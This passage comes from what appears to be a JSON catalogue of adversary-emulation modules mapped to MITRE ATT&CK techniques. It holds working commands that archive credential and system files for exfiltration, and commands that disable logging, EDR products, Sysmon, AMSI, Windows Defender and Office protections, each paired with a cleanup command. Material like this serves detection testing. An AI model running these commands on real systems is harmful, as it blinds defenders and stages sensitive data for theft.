      ],
      "rx_module_id": "36c62584-d360-41d6-886f-d194654be7c2",
      "module_name": "ESXi - Remove Syslog remote IP"
    },
    {
      "index": 1491,
      "technique_id": "T1560.001",
      "technique_name": "Archive Collected Data: Archive via Utility",
      "description": "An adversary may compress data using Makecab (in-built Windows binary) that is collected prior to exfiltration.\n[reference](https://unit42.paloaltonetworks.com/exchange-server-credential-harvesting/)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "makecab.exe #{input_file} #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": "del #{output_file}\n"
      },
      "variables": [
        {
          "name": "input_file",
          "description": "Path to source file for compression",
          "type": "path",
          "default_value": "C:\\Temp\\sam.hiv"
        },
        {
          "name": "output_file",
          "description": "Path of the CAB file",
          "type": "path",
          "default_value": "C:\\Temp\\art.zip"
        }
      ],
      "prerequisites": [
        {
          "description": "A sample file for compression must be located at specified location (#{input_file})\n",
          "check_command": "if not exist \"#{input_file}\" (exit /b 1)\n",
          "install_command": "fsutil file createnew c:\\Temp\\sam.hiv 10485760\n"
        }
      ],
      "rx_module_id": "2a7bc405-9555-4f49-ace2-b2ae2941d629",
      "module_name": "Compress a File for Exfiltration using Makecab"
    },
    {
      "index": 1492,
      "technique_id": "T1560.001",
      "technique_name": "Archive Collected Data: Archive via Utility",
      "description": "Copies the AppData folder, compresses it, and cleans up temporary files.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "$AppData=\"$env:USERPROFILE\\AppData\"\n$Copy=\"#{destination_folder}\"\n$Zip=\"#{zip_file_path}\"\n\nif (Test-Path $Copy) { Remove-Item $Copy -Recurse -Force }\nNew-Item -ItemType Directory -Path $Copy | Out-Null\n\nGet-ChildItem $AppData -Recurse -Force | ForEach-Object {\n  $rel = $_.FullName.Substring($AppData.Length + 1)\n  $dest = Join-Path $Copy $rel\n  if ($_.PSIsContainer) { New-Item -ItemType Directory -Path $dest -Force | Out-Null }\n  else { Copy-Item $_.FullName -Destination $dest -Force -ErrorAction SilentlyContinue }\n}\n\nAdd-Type -AssemblyName System.IO.Compression.FileSystem\n[System.IO.Compression.ZipFile]::CreateFromDirectory($Copy, $Zip, [System.IO.Compression.CompressionLevel]::Optimal, $false)\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "destination_folder",
          "description": "Temporary copy location",
          "type": "Path",
          "default_value": "$env:USERPROFILE\\Desktop\\AppDataCopy"
        },
        {
          "name": "zip_file_path",
          "description": "ZIP archive path",
          "type": "Path",
          "default_value": "$env:USERPROFILE\\Desktop\\AppDataBackup.zip"
        }
      ],
      "prerequisites": [
        {
          "description": "Requires admin and .NET compression libraries",
          "check_command": "if (-not ([Security.Principal.WindowsPrincipal] `\n    [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(`\n    [Security.Principal.WindowsBuiltInRole]::Administrator)) { exit 1 }\nif (-not (Test-Path \"$env:USERPROFILE\\AppData\")) { exit 1 }\n",
          "install_command": "Run PowerShell as Administrator and ensure .NET compression assemblies are available.\n"
        }
      ],
      "rx_module_id": "05e8942e-f04f-460a-b560-f7781257feec",
      "module_name": "Copy and Compress AppData Folder"
    },
    {
      "index": 1493,
      "technique_id": "T1560.002",
      "technique_name": "Archive Collected Data: Archive via Library",
      "description": "Uses GZip from Python to compress files\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "which_python=`which python || which python3`\n$which_python -c \"import gzip;input_file=open('#{path_to_input_file}', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('#{path_to_output_file}','wb',compresslevel=6);output_file.write(content);output_file.close();\"\n",
        "elevation_required": false,
        "cleanup_command": "rm #{path_to_output_file}\n"
      },
      "variables": [
        {
          "name": "path_to_input_file",
          "description": "Path to the file that you want to compress",
          "type": "path",
          "default_value": "/etc/passwd"
        },
        {
          "name": "path_to_output_file",
          "description": "Path of the file that you want your .gz file to be",
          "type": "path",
          "default_value": "/tmp/passwd.gz"
        }
      ],
      "prerequisites": [
        {
          "description": "Requires Python\n",
          "check_command": "which python || which python3\n",
          "install_command": "echo \"please install python to run this test\"; exit 1\n"
        }
      ],
      "rx_module_id": "391f5298-b12d-4636-8482-35d9c17d53a8",
      "module_name": "Compressing data using GZip in Python (FreeBSD/Linux)"
    },
    {
      "index": 1494,
      "technique_id": "T1560.002",
      "technique_name": "Archive Collected Data: Archive via Library",
      "description": "Uses bz2 from Python to compress files\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "which_python=`which python || which python3`\n$which_python -c \"import bz2;input_file=open('#{path_to_input_file}','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('#{path_to_output_file}','w+');output_file.write(str(bz2content));output_file.close();\"\n",
        "elevation_required": false,
        "cleanup_command": "rm #{path_to_output_file}\n"
      },
      "variables": [
        {
          "name": "path_to_input_file",
          "description": "Path to the file that you want to compress",
          "type": "path",
          "default_value": "/etc/passwd"
        },
        {
          "name": "path_to_output_file",
          "description": "Path of the file that you want your .bz2 file to be",
          "type": "path",
          "default_value": "/tmp/passwd.bz2"
        }
      ],
      "prerequisites": [
        {
          "description": "Requires Python\n",
          "check_command": "which python || which python3\n",
          "install_command": "echo \"please install python to run this test\"; exit 1\n"
        }
      ],
      "rx_module_id": "c75612b2-9de0-4d7c-879c-10d7b077072d",
      "module_name": "Compressing data using bz2 in Python (FreeBSD/Linux)"
    },
    {
      "index": 1495,
      "technique_id": "T1560.002",
      "technique_name": "Archive Collected Data: Archive via Library",
      "description": "Uses zipfile from Python to compress files\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "which_python=`which python || which python3`\n$which_python -c \"from zipfile import ZipFile; ZipFile('#{path_to_output_file}', mode='w').write('#{path_to_input_file}')\"\n",
        "elevation_required": false,
        "cleanup_command": "rm #{path_to_output_file}\n"
      },
      "variables": [
        {
          "name": "path_to_input_file",
          "description": "Path to the file that you want to compress",
          "type": "path",
          "default_value": "/etc/passwd"
        },
        {
          "name": "path_to_output_file",
          "description": "Path of the file that you want your .zip file to be",
          "type": "path",
          "default_value": "/tmp/passwd.zip"
        }
      ],
      "prerequisites": [
        {
          "description": "Requires Python\n",
          "check_command": "which python || which python3\n",
          "install_command": "echo \"please install python to run this test\"; exit 1\n"
        }
      ],
      "rx_module_id": "001a042b-859f-44d9-bf81-fd1c4e2200b0",
      "module_name": "Compressing data using zipfile in Python (FreeBSD/Linux)"
    },
    {
      "index": 1496,
      "technique_id": "T1560.002",
      "technique_name": "Archive Collected Data: Archive via Library",
      "description": "Uses tarfile from Python to compress files\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "which_python=`which python || which python3`\n$which_python -c \"import tarfile; output_file = tarfile.open('#{path_to_output_file}','w'); output_file.add('#{path_to_input_file}'); output_file.close()\" \n",
        "elevation_required": false,
        "cleanup_command": "rm #{path_to_output_file}\n"
      },
      "variables": [
        {
          "name": "path_to_input_file",
          "description": "Path to the file that you want to compress",
          "type": "path",
          "default_value": "/etc/passwd"
        },
        {
          "name": "path_to_output_file",
          "description": "Path of the file that you want your .tar.gz file to be",
          "type": "path",
          "default_value": "/tmp/passwd.tar.gz"
        }
      ],
      "prerequisites": [
        {
          "description": "Requires Python\n",
          "check_command": "which python || which python3\n",
          "install_command": "echo \"please install python to run this test\"; exit 1\n"
        }
      ],
      "rx_module_id": "e86f1b4b-fcc1-4a2a-ae10-b49da01458db",
      "module_name": "Compressing data using tarfile in Python (FreeBSD/Linux)"
    },
    {
      "index": 1497,
      "technique_id": "T1562",
      "technique_name": "Impair Defenses",
      "description": "The following RAGLOX adds a registry entry to disable LSA Protection.\n\nThe LSA controls and manages user rights information, password hashes and other important bits of information in memory. Attacker tools, such as mimikatz, rely on accessing this content to scrape password hashes or clear-text passwords. Enabling LSA Protection configures Windows to control the information stored in memory in a more secure fashion - specifically, to prevent non-protected processes from accessing that data.\nUpon successful execution, the registry will be modified and RunAsPPL will be set to 0, disabling Lsass protection.\nhttps://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection#how-to-disable-lsa-protection\nhttps://blog.netwrix.com/2022/01/11/understanding-lsa-protection/\nhttps://thedfirreport.com/2022/03/21/phosphorus-automates-initial-access-using-proxyshell/  \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "40075d5f-3a70-4c66-9125-f72bee87247d",
      "module_name": "Windows Disable LSA Protection"
    },
    {
      "index": 1498,
      "technique_id": "T1562",
      "technique_name": "Impair Defenses",
      "description": "The RAGLOX module disables the journal logging using built-in systemctl utility\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo systemctl stop systemd-journald #disables journal logging\n",
        "elevation_required": true,
        "cleanup_command": "sudo systemctl start systemd-journald #starts journal service\nsudo systemctl enable systemd-journald #starts journal service automatically at boot time\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "c3a377f9-1203-4454-aa35-9d391d34768f",
      "module_name": "Disable journal logging via systemctl utility"
    },
    {
      "index": 1499,
      "technique_id": "T1562",
      "technique_name": "Impair Defenses",
      "description": "The RAGLOX module disables the journal logging by searching and replacing the \"Storage\" parameter to \"none\" within the journald.conf file, thus any new journal entries will only be temporarily available in memory and not written to disk\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf\n",
        "elevation_required": true,
        "cleanup_command": "sudo sed -i 's/Storage=none/Storage=auto/' /etc/systemd/journald.conf #re-enables storage of journal data\nsudo systemctl restart systemd-journald #restart the journal service\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "12e5551c-8d5c-408e-b3e4-63f53b03379f",
      "module_name": "Disable journal logging via sed utility"
    },
    {
      "index": 1500,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Disables syslog collection\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "#{flavor_command}\n",
        "elevation_required": true,
        "cleanup_command": "#{cleanup_command}\n"
      },
      "variables": [
        {
          "name": "package_checker",
          "description": "Package checking command for linux.",
          "type": "string",
          "default_value": "(rpm -q rsyslog 2>&1 >/dev/null) || (dpkg -s rsyslog | grep -q installed)"
        },
        {
          "name": "package_installer",
          "description": "Package installer command for linux. Default yum",
          "type": "string",
          "default_value": "(which yum && yum -y install epel-release rsyslog)||(which apt-get && apt-get install -y rsyslog)"
        },
        {
          "name": "flavor_command",
          "description": "Command to disable syslog collection. Default newer rsyslog commands. i.e older command = service rsyslog stop ; chkconfig off rsyslog",
          "type": "string",
          "default_value": "systemctl stop rsyslog ; systemctl disable rsyslog"
        },
        {
          "name": "cleanup_command",
          "description": "Command to enable syslog collection. Default newer rsyslog commands. i.e older command = service rsyslog start ; chkconfig rsyslog on",
          "type": "string",
          "default_value": "systemctl start rsyslog ; systemctl enable rsyslog"
        }
      ],
      "prerequisites": [
        {
          "description": "Package with rsyslog must be on system\n",
          "check_command": "if #{package_checker} > /dev/null; then exit 0; else exit 1; fi\n",
          "install_command": "sudo #{package_installer} \n"
        }
      ],
      "rx_module_id": "4ce786f8-e601-44b5-bfae-9ebb15a7d1c8",
      "module_name": "Disable syslog"
    },
    {
      "index": 1501,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Disables syslog collection\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "service syslogd stop\nsysrc syslogd_enable=\"NO\"\n",
        "elevation_required": true,
        "cleanup_command": "sysrc syslogd_enable=\"YES\"\nservice syslogd start\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "db9de996-441e-4ae0-947b-61b6871e2fdf",
      "module_name": "Disable syslog (freebsd)"
    },
    {
      "index": 1502,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Disable the Cb Response service\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service cbdaemon stop\n  chkconfig off cbdaemon\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop cbdaemon\n  systemctl disable cbdaemon\nfi\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ae8943f7-0f8d-44de-962d-fbc2e2f03eb8",
      "module_name": "Disable Cb Response"
    },
    {
      "index": 1503,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Disables SELinux enforcement\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "setenforce 0\n",
        "elevation_required": true,
        "cleanup_command": "setenforce 1\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "SELinux must be installed\n",
          "check_command": "which setenforce\n",
          "install_command": "echo \"SELinux is not installed\"; exit 1\n"
        }
      ],
      "rx_module_id": "fc225f36-9279-4c39-b3f9-5141ab74f8d8",
      "module_name": "Disable SELinux"
    },
    {
      "index": 1504,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Stop and disable Crowdstrike Falcon on Linux\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "sudo systemctl stop falcon-sensor.service\nsudo systemctl disable falcon-sensor.service\n",
        "elevation_required": true,
        "cleanup_command": "sudo systemctl enable falcon-sensor.service\nsudo systemctl start falcon-sensor.service\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "828a1278-81cc-4802-96ab-188bf29ca77d",
      "module_name": "Stop Crowdstrike Falcon on Linux"
    },
    {
      "index": 1505,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Disables Carbon Black Response\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist\nsudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist\n",
        "elevation_required": true,
        "cleanup_command": "sudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.daemon.plist\nsudo launchctl load -w /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8fba7766-2d11-4b4a-979a-1e3d9cc9a88c",
      "module_name": "Disable Carbon Black Response"
    },
    {
      "index": 1506,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Disables LittleSnitch\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n",
        "elevation_required": true,
        "cleanup_command": "sudo launchctl load -w /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "62155dd8-bb3d-4f32-b31c-6532ff3ac6a3",
      "module_name": "Disable LittleSnitch"
    },
    {
      "index": 1507,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Disables OpenDNS Umbrella\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n",
        "elevation_required": true,
        "cleanup_command": "sudo launchctl load -w /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "07f43b33-1e15-4e99-be70-bc094157c849",
      "module_name": "Disable OpenDNS Umbrella"
    },
    {
      "index": 1508,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Disables macOS Gatekeeper\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo spctl --master-disable\n",
        "elevation_required": true,
        "cleanup_command": "sudo spctl --master-enable\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "2a821573-fb3f-4e71-92c3-daac7432f053",
      "module_name": "Disable macOS Gatekeeper"
    },
    {
      "index": 1509,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo launchctl unload #{falcond_plist}\nsudo launchctl unload #{userdaemon_plist}\n",
        "elevation_required": true,
        "cleanup_command": "sudo launchctl load -w #{falcond_plist}\nsudo launchctl load -w #{userdaemon_plist}\n"
      },
      "variables": [
        {
          "name": "falcond_plist",
          "description": "The path of the Crowdstrike Falcon plist file",
          "type": "path",
          "default_value": "/Library/LaunchDaemons/com.crowdstrike.falcond.plist"
        },
        {
          "name": "userdaemon_plist",
          "description": "The path of the Crowdstrike Userdaemon plist file",
          "type": "path",
          "default_value": "/Library/LaunchDaemons/com.crowdstrike.userdaemon.plist"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "b3e7510c-2d4c-4249-a33f-591a2bc83eef",
      "module_name": "Stop and unload Crowdstrike Falcon on macOS"
    },
    {
      "index": 1510,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution,\nrun the prereq_command's and it should fail with an error of \"sysmon filter must be loaded\".\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "fltmc.exe unload #{sysmon_driver}\n",
        "elevation_required": true,
        "cleanup_command": "sysmon -u -i > nul 2>&1\nsysmon -i -accepteula -i > nul 2>&1\n\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -u > nul 2>&1\n\"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -accepteula -i > nul 2>&1\n"
      },
      "variables": [
        {
          "name": "sysmon_driver",
          "description": "The name of the Sysmon filter driver (this can change from the default)",
          "type": "string",
          "default_value": "SysmonDrv"
        }
      ],
      "prerequisites": [
        {
          "description": "Sysmon must be downloaded\n",
          "check_command": "if ((cmd.exe /c \"where.exe Sysmon.exe 2> nul | findstr /i Sysmon 2> nul\") -or (Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\")) { exit 0 } else { exit 1 }\n",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Sysmon.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Sysmon.zip\"\nExpand-Archive \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Sysmon.zip\" \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Sysmon\" -Force\n"
        },
        {
          "description": "sysmon must be Installed\n",
          "check_command": "if(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit 1 }\n",
          "install_command": "if(cmd.exe /c \"where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul\") { C:\\Windows\\Sysmon.exe -accepteula -i } else\n{ & \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -accepteula -i}\n"
        },
        {
          "description": "sysmon filter must be loaded\n",
          "check_command": "if(fltmc.exe filters | findstr #{sysmon_driver}) { exit 0 } else { exit 1 }\n",
          "install_command": "if(Test-Path \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\"){\n  & \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -u\n  & \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\Sysmon\\Sysmon.exe\" -accepteula -i\n}else{\n  sysmon -u\n  sysmon -accepteula -i\n}\n"
        }
      ],
      "rx_module_id": "811b3e76-c41b-430c-ac0d-e2380bfaa164",
      "module_name": "Unload Sysmon Filter Driver"
    },
    {
      "index": 1511,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Uninstall Sysinternals Sysmon for Defense Evasion\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "sysmon -u\n",
        "elevation_required": true,
        "cleanup_command": "sysmon -i -accepteula >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "sysmon_exe",
          "description": "The location of the Sysmon executable from Sysinternals (ignored if sysmon.exe is found in your PATH)",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1562.001\\bin\\sysmon.exe"
        }
      ],
      "prerequisites": [
        {
          "description": "Sysmon executable must be available\n",
          "check_command": "if(cmd /c where sysmon) {exit 0} else {exit 1}\n",
          "install_command": "$parentpath = Split-Path \"#{sysmon_exe}\"; $zippath = \"$parentpath\\Sysmon.zip\"\nNew-Item -ItemType Directory $parentpath -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Sysmon.zip\" -OutFile \"$zippath\"\nExpand-Archive $zippath $parentpath -Force; Remove-Item $zippath\nif(-not ($Env:Path).contains($parentpath)){$Env:Path += \";$parentpath\"}\n"
        },
        {
          "description": "Sysmon must be installed\n",
          "check_command": "if(cmd /c sc query sysmon) { exit 0} else { exit 1}\n",
          "install_command": "cmd /c sysmon -i -accepteula\n"
        }
      ],
      "rx_module_id": "a316fb2e-5344-470d-91c1-23e15c374edc",
      "module_name": "Uninstall Sysmon"
    },
    {
      "index": 1512,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Any easy way to bypass AMSI inspection is it patch the dll in memory setting the \"amsiInitFailed\" function to true.\nUpon execution, no output is displayed.\n\nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n",
        "elevation_required": false,
        "cleanup_command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "695eed40-e949-40e5-b306-b4031e4154bd",
      "module_name": "AMSI Bypass - AMSI InitFailed"
    },
    {
      "index": 1513,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis test removes the Windows Defender provider registry key. Upon execution, no output is displayed.\nOpen Registry Editor and navigate to \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\\" to verify that it is gone.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse\n",
        "elevation_required": true,
        "cleanup_command": "New-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\" -Name \"{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -ErrorAction Ignore | Out-Null\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "13f09b91-c953-438e-845b-b585e51cac9b",
      "module_name": "AMSI Bypass - Remove AMSI Provider Reg Key"
    },
    {
      "index": 1514,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.\nChange the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.\nTo verify that the service has stopped, run \"sc query McAfeeDLPAgentService\"\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "net.exe stop #{service_name}\nsc.exe config #{service_name} start= disabled\n",
        "elevation_required": true,
        "cleanup_command": "sc.exe config #{service_name} start= auto >nul 2>&1\nnet.exe start #{service_name} >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "service_name",
          "description": "The name of the service to stop",
          "type": "string",
          "default_value": "McAfeeDLPAgentService"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "a1230893-56ac-4c81-b644-2108e982f8f5",
      "module_name": "Disable Arbitrary Security Windows Service"
    },
    {
      "index": 1515,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-MpPreference -DisableRealtimeMonitoring 1\nSet-MpPreference -DisableBehaviorMonitoring 1\nSet-MpPreference -DisableScriptScanning 1\nSet-MpPreference -DisableBlockAtFirstSeen 1\n",
        "elevation_required": true,
        "cleanup_command": "Set-MpPreference -DisableRealtimeMonitoring 0\nSet-MpPreference -DisableBehaviorMonitoring 0\nSet-MpPreference -DisableScriptScanning 0\nSet-MpPreference -DisableBlockAtFirstSeen 0\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "6b8df440-51ec-4d53-bf83-899591c9b5d7",
      "module_name": "Tamper with Windows Defender ATP PowerShell"
    },
    {
      "index": 1516,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.\nHowever, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, \"Access Denied\"\nwill be displayed twice and the WinDefend service status will be displayed.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "sc stop WinDefend\nsc config WinDefend start=disabled\nsc query WinDefend\n",
        "elevation_required": true,
        "cleanup_command": "sc start WinDefend >nul 2>&1\nsc config WinDefend start=enabled >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "aa875ed4-8935-47e2-b2c5-6ec00ab220d2",
      "module_name": "Tamper with Windows Defender Command Prompt"
    },
    {
      "index": 1517,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\ngrayed out and have no info.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n",
        "elevation_required": true,
        "cleanup_command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 0\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1b3e0146-a1e5-4c5c-89fb-1bb2ffe8fc45",
      "module_name": "Tamper with Windows Defender Registry"
    },
    {
      "index": 1518,
      "technique_id": "T1562.001",
      "technique_name": "Impair Defenses: Disable or Modify Tools",
      "description": "Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not\nshow any warning before editing the document.\n\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"\n",
        "elevation_required": false,
